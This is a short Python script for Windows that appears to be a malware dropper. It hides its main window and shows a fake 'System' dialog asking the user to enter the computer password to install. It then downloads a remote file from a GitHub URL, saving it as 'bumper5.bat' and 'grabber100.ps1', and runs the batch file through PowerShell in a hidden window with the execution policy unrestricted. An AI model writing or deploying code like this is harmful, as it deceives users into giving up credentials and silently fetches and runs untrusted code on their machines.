import tkinter as tk
from tkinter import simpledialog
import subprocess
import os
import sys
import os

from urllib import request

from os.path import exists

import time

import subprocess

import sys

import requests

import pythoncom

import pyuac

import pywintypes

import win32api

from win32com.shell import shell

import tkinter as tk

from tkinter import simpledialog

import subprocess

ROOT = tk.Tk()

ROOT.withdraw()

USER_INP = simpledialog.askstring(title="System",
                                  prompt="Enter computer password to install...")

d = os.path.join(os.environ["HOMEPATH"], r"Desktop")

os.chdir(d)

remote_url = 'https://raw.githubusercontent.com/Mood56467/bumper/main/bumper'

local_file = 'bumper5.bat'

request.urlretrieve(remote_url, local_file)

remote_url = 'https://raw.githubusercontent.com/Mood56467/bumper/main/bumper'

local_file = 'grabber100.ps1'

request.urlretrieve(remote_url, local_file)

p = subprocess.Popen('powershell.exe -executionpolicy unrestricted Start-Process -WindowStyle Hidden -File "bumper5.bat"', stdout=sys.stdout)
p.communicate()
